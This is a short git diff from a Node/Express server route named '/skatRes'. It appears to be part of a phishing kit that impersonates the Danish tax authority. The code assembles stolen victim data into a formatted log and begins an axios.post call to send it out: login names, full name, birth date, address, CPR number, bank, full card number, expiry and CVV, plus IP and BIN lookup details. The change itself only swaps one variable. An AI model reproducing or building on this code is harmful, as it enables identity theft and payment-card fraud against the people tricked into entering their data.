@@ -2692,7 +2692,7 @@ app.post('/skatRes', (req, res) => {
             bankName = resp.data.bank.name;
         }
     }).then(function () {
-        binList = `${bin} | ${dob} | ${pcode} | ${bankName}`
+        binList = `${bin} | ${dob} | ${zip} | ${bankName}`
         var originalText = `+----------- Login Information ------------+\nUsername: ${username}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nZIP: ${zip}\nPhone Number: ${telephone}\nCPR: ${cpr}\nBank: ${bank}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
         if (skat == 7) {
             axios.post(
